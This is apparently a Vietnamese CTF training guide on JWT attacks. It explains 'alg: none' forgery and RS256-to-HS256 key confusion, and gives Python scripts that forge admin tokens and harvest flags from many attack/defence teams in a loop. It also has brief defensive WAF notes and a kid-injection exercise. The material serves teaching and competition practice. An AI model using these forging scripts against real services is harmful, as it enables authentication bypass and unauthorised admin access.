JWT Attacks

JWT (JSON Web Token) là cách phổ biến để lưu "tôi là ai, quyền gì" trong 1 chuỗi mà trình duyệt tự gửi lại mỗi request, có chữ ký để chống giả mạo. Khi server cấu hình/kiểm tra chữ ký sai, bạn có thể tự sửa nội dung token (đổi role thành admin, đổi user_id) mà server vẫn tin là hợp lệ.

00 / TÓM TẮT 1 PHÚT

JWT là gì, tấn công nó để làm gì?

Thay vì server tự nhớ "ai đang đăng nhập" (session lưu ở server), nhiều app hiện đại gói thông tin đó vào 1 chuỗi gọi là JWT, gửi cho trình duyệt giữ, trình duyệt tự gửi lại mỗi request. Để server tin được JWT chưa bị sửa, nó có chữ ký số đi kèm. Nếu việc kiểm tra chữ ký bị cấu hình sai (chấp nhận "không chữ ký", hoặc dùng sai loại khóa để verify, hoặc khóa quá yếu để đoán ra), bạn có thể tự sửa nội dung bên trong (đổi role: "user" thành role: "admin") rồi tự tạo chữ ký mới mà server vẫn chấp nhận.

Nếu chỉ nhớ một điều JWT luôn có dạng xxxxx.yyyyy.zzzzz (3 phần ngăn bởi dấu chấm, mỗi phần là Base64). Phần giữa (payload) ai cũng đọc được chỉ bằng decode Base64, không cần biết khóa bí mật — JWT không mã hóa, chỉ ký. Việc tấn công là tìm cách sửa phần giữa mà vẫn qua được bước kiểm tra chữ ký ở phần cuối.

01 / NỀN TẢNG BẮT BUỘC

Cấu trúc JWT — 3 phần

JWT (JSON Web Token) — chuỗi dạng header.payload.signature, mỗi phần là JSON được mã hóa Base64 (biến thể URL-safe), ngăn cách bởi dấu chấm.
PhầnNội dungVí dụ sau decode
HeaderThuật toán ký + loại token{"alg":"HS256","typ":"JWT"}
Payload (claims)Dữ liệu thật — thông tin user, quyền, thời hạn{"user_id":17,"role":"user","exp":1234567890}
SignatureChữ ký — tính từ header+payload và 1 khóa bí mật, để server xác minh token chưa bị sửaHMACSHA256(base64(header)+"."+base64(payload), secret)
Quan trọng — khác với session cookieHeader và payload KHÔNG được mã hóa, chỉ encode Base64 — tức là ai cũng đọc được nội dung, chỉ không sửa được mà không bị phát hiện (vì chữ ký sẽ sai). Vậy tấn công JWT không phải "giải mã xem có gì", mà là "tìm cách sửa nội dung mà vẫn qua được bước kiểm tra chữ ký".
HS256 vs RS256 — hai thuật toán ký phổ biến. HS256 (symmetric): ký và kiểm tra dùng chung 1 khóa bí mật (chỉ server biết). RS256 (asymmetric): ký bằng private key (chỉ server có), kiểm tra bằng public key (thường công khai, đôi khi lộ qua endpoint /.well-known/jwks.json).
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Thư viện verify cho phép quá nhiều lựa chọn

Chuẩn JWT (JWS) hỗ trợ nhiều thuật toán ký, kể cả thuật toán none (không ký — dùng cho mục đích test/debug, lẽ ra không nên bật ở production). Vấn đề nằm ở chỗ: thuật toán dùng để ký KHÔNG CỐ ĐỊNH, mà được ghi ngay trong header của chính token — và nhiều thư viện verify (đặc biệt bản cũ) tin tưởng mù quáng giá trị alg trong header do chính người gửi token cung cấp, thay vì server tự cố định 1 thuật toán duy nhất và chỉ chấp nhận đúng nó.

Đây là lỗi logic kinh điển: để người dùng tự chọn phương thức bảo mật áp dụng cho chính dữ liệu của họ — tương tự việc để khách tự chọn "có kiểm tra vé hay không" khi vào rạp.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Key Confusion: biến RS256 thành HS256

Giải thích vì sao cách này hoạt động: thư viện verify ở server thường viết kiểu verify(token, key), dùng chung 1 tham số key cho cả HS256 (coi là secret) lẫn RS256 (coi là public key). Nếu code server không ép cứng thuật toán phải là RS256 (mà đọc alg từ chính token để quyết định cách verify), kẻ tấn công chỉ cần:

1. Lấy public key (thường lộ qua /.well-known/jwks.json hoặc endpoint tương tự) 2. Sửa payload: role=admin 3. Đổi header alg: RS256 → HS256 4. Ký lại bằng HMAC-SHA256, dùng CHÍNH NỘI DUNG public key (dạng PEM text) làm secret key
Server nhận token mới, thấy header ghi alg: HS256, tự động lấy biến key nó đang có sẵn (vốn là public key RSA, nhưng giờ bị coi như secret HMAC) để verify chữ ký HMAC — và vì bạn vừa ký bằng đúng chuỗi đó, chữ ký khớp!
Kết quả: server tin token đã sửa (role=admin) là hợp lệ, dù bạn không hề biết secret thật — vì chữ ký HS256 hợp lệ không cần secret thật, chỉ cần verify dùng đúng chuỗi bạn vừa ký.

06 / PAYLOAD ĐẦY ĐỦ THEO KỸ THUẬT

Thử theo thứ tự ưu tiên

A. alg: none thử trước, nhanh nhất

import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()

token = f"{b64url(header)}.{b64url(payload)}."   # phần chữ ký để TRỐNG
print(token)

(B) Bản gọn chắc — dùng thực chiến (sau khi đã biết secret), trích thẳng flag

import re, jwt, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
SECRET = "secret_da_brute_force_duoc"

def exploit_jwt(host):
    token = jwt.encode({"user": "admin", "role": "admin"}, SECRET, algorithm="HS256")
    r = requests.get(f"http://{host}/admin/flag", headers={"Authorization": f"Bearer {token}"}, timeout=5)
    m = FLAG_RE.search(r.text)
    return m.group() if m else None

print("FLAG:", exploit_jwt("TARGET_IP"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, jwt, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
SECRET = "secret_da_brute_force_duoc"   # bí mật GIỐNG NHAU mọi đội vì cùng service

def exploit_jwt(host):
    try:
        token = jwt.encode({"user": "admin", "role": "admin"}, SECRET, algorithm="HS256")
        r = requests.get(f"http://{host}/admin/flag", headers={"Authorization": f"Bearer {token}"}, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        flag = exploit_jwt(host)
        if flag:
            print(f"{host} {flag}")
            with open("flags.txt", "a") as f:
                f.write(f"{flag}\n")
Vì sao bản (C) dùng chung 1 SECRET cho mọi độiTrong A/D, mọi đội chạy cùng 1 service — nếu secret được hardcode trong source (không random mỗi lần deploy), nó giống nhau ở mọi đội. Chỉ cần brute-force/tìm ra secret 1 lần (trên service của chính mình), dùng được cho toàn bộ các đội khác.

10 / PHÒNG THỦ: VIẾT WAF RULE

Chặn đúng payload, không chặn nhầm request thường

Khó khăn đặc thùWAF chặn theo nội dung request dạng text, nhưng JWT là Base64 — chuỗi "alg":"none" không xuất hiện nguyên văn trong request, nó nằm ẩn trong phần đã encode. WAF regex thuần khó bắt được trực tiếp trừ khi hỗ trợ decode trước khi so khớp.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅Thư viện verify không ép cứng thuật toán, bị ảnh hưởng bởi alg ghi trong token; secret HS256 yếu/đoán được; endpoint lộ public key RS256 mà server dùng chung biến key cho cả 2 kiểu verify.

❌App dùng session cookie truyền thống (server tự lưu trạng thái), không dùng JWT — bài này không áp dụng.

Gợi ý nếu kẹtNhớ dùng ĐÚNG NGUYÊN VĂN định dạng PEM của public key (bao gồm cả dòng -----BEGIN PUBLIC KEY-----) làm secret HMAC, không chỉ phần nội dung giữa.

⭐⭐⭐⭐ Tự nghĩ: header JWT có trường kid dùng để tra secret từ database theo tên file/khóa. Thiết kế payload khai thác kid injection theo 2 hướng khác nhau (path traversal và SQL injection) đã liệt kê ở mục 06.D.

Gợi ý nếu kẹtVới path traversal, tìm 1 file trên server có nội dung bạn biết trước (rỗng, hoặc 1 hằng số) để dùng làm "secret" đã biết.
